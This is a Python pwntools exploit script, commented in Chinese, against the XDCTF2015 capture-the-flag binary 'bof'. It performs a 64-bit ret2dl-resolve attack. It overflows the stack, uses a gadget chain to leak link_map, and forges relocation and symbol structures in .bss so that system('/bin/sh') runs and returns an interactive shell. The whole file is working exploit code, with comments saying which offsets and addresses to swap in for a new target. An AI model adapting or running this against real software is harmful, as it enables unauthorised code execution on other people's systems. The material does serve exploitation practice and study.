#!/usr/bin/python
#coding:utf-8
from pwn import *

#需修改:文件名、溢出偏移、gadget地址、各节地址
fpath = './bof'
offset = 112
length = 0x100
stack_size = 0x800
main_addr=0x400676
p6_addr=0x4007AA
call_addr=0x400790
leave_ret=0x4006ab
p_rbp_ret=0x4005e0
p_rdi_ret=0x4007b3

elf = ELF(fpath)
write_got=elf.got['write']
read_got=elf.got['read']
read_plt = elf.plt['read']
write_plt = elf.plt['write']
got_8=elf.get_section_by_name('.got.plt').header.sh_addr+8   #0x601008
bss_addr =elf.get_section_by_name('.bss').header.sh_addr
base_stage = bss_addr + stack_size
#print 'got_8=',hex(got_8)

def makecall(addr, rdi, rsi, rdx, tail = 0):
    payload = ''
    payload += p64(p6_addr)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(addr)
    payload += p64(rdx)
    payload += p64(rsi)
    payload += p64(rdi)
    payload += p64(call_addr)
    if (tail):
        payload += p64(0x0) * 7 + p64(tail)
    return payload

p = process(fpath)
print p.recv()        # 'Welcome to XDCTF2015~!\n'
#1.泄露&link_map地址
payload='\x00'*offset
payload+='\x00'*8
payload+=makecall(write_got,1,got_8,8,tail=main_addr)
payload=payload.ljust(0x100,'\x00')
p.send(payload)
link_map = u64(p.recv(8))
print 'link_map=',hex(link_map)

#2.往link_map+0x1c8写0
payload='\x00'*offset
payload+='\x00'*8
payload+=makecall(read_got,0,link_map+0x1c8,8,tail=main_addr)
payload=payload.ljust(0x100,'\x00')
p.send(payload)
p.send(p64(0))

#3.往base_stage写入伪造结构并跳过去
payload='\x00'*offset
payload+='\x00'*8
payload+=makecall(read_got,0,base_stage,0xd0,tail=0)   #假设结构大小是400
payload+=p64(0)*2+p64(base_stage)+p64(0)*4
payload+=p64(leave_ret)
payload=payload.ljust(0x100,'\x00')
p.send(payload)


#4.bss数据：rop-参数放在寄存器/ 伪造结构  
#(1)确定各个节的地址 
cmd = "/bin/sh"
plt_0 = 0x400510 # objdump -d -j .plt bof
rel_plt = 0x400470 # objdump -s -j .rela.plt bof
write_got = elf.got['write']
dynsym = 0x4002c0 #readelf -S bof
dynstr = 0x400398
#(2)确定重定位下标
index_offset = base_stage + 7*8
align = 24 - ((index_offset-rel_plt) % 24)  # 这里的对齐操作是因为dynsym里的ELF64_R_SYM结构体都是24字节大小
index_offset = index_offset + align
index = (index_offset - rel_plt) / 24 # base_stage + 7*8 指向fake_reloc，减去rel_plt即偏移
#(3)确定动态链接符号下标
fake_sym_addr = base_stage + 13*8
align = 24 - ((fake_sym_addr - dynsym) % 24)# 这里的对齐操作是因为dynsym里的Elf64_Sym结构体都是24字节大小
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 24 # 除以24因为Elf64_Sym结构体的大小为24，得到write的dynsym索引号
#(4)伪造重定位结构+动态链接结构
r_info = (index_dynsym << 32) | 0x7
fake_reloc = p64(write_got) + p64(r_info) + p64(0)
st_name = (fake_sym_addr + 24) - dynstr   #fake_sym（Elf32_Sym结构体）大小0x10
fake_sym = p32(st_name) + p32(0x12) + p64(0) + p64(0)

payload2 = 'AAAAAAAA'
payload2 += p64(p_rdi_ret)
payload2 += p64(base_stage+0xc0)   #/bin/sh
payload2 += p64(plt_0)
payload2 += p64(index)       #jmprel 下标参数
payload2 += 'AAAAAAAA'       #返回地址
payload2 += 'aaaaaaaa'

payload2 = payload2.ljust(index_offset-base_stage,'B')
payload2 += fake_reloc # index_offset(base_stage+7*8)的位置
payload2 = payload2.ljust(fake_sym_addr-base_stage,'B')
payload2 += fake_sym   # fake_sym_addr(base_stage+9*8)的位置

payload2 += "system\x00"
payload2 = payload2.ljust(0xc0,'\x00')
payload2 += cmd + '\x00'
payload2 = payload2.ljust(0xd0,'\x00')
#gdb.attach(p,'b *0x4006ab')
#raw_input('wait!!\n')
p.send(payload2)
p.interactive()
